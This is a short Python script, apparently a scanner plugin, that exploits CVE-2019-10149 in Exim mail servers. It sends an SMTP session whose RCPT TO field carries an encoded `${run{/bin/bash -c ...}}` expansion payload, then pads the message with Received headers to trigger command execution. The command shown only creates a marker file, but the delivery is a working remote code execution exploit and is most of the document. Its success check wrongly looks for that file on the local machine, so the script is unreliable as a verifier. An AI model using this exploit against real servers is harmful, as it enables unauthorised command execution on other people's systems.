import time
import sys
import socket
import os

def check(url, ip, port):
    user = "root"
    #远程命令执行漏洞，看命令是否成功执行来判断
    payload = "${run{\\x2fbin\\x2fbash\\x20-c\\x20\\x22touch\\x20\\x2ftmp\\x2fcve-2019-10149\\x22}}"
    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def write(data):
        d = bytes(str(data).encode("ASCII"))
        bot.send(d + b"\n")

    def re():
        r = bot.recv(2048).decode("utf-8")
        return r

    try:
        bot.connect((ip, port))
        time.sleep(2)
        print(re())
        time.sleep(1)
        write("EHLO localhost")
        write("MAIL FROM:<>")
        print(re())
        write("RCPT TO:%s%s@%s" % (user, payload, url))
        time.sleep(2)
        o = re()
        print(o)

        if not o.startswith("250"):
            print("ERROR: may be incorrect host (user$payload@HOST)")
            print("Server response:", o)
            return "未验证"

        write("DATA")
        print(re())
        
        for n in range(32):
            write("Received: %s" % n)
        
        write("")
        write(".")
        print(re())
        bot.close()

        # 检查/tmp目录下是否存在文件cve-2019-10149
        if os.path.exists('/tmp/cve-2019-10149'):
            os.remove('/tmp/cve-2019-10149')  # 清理文件
            return ("[!] Exim server seems to be vulnerable to CVE-2019-10149.")
    except Exception as e:
        print(f"Error: {e}")
        return "未验证"

    return None
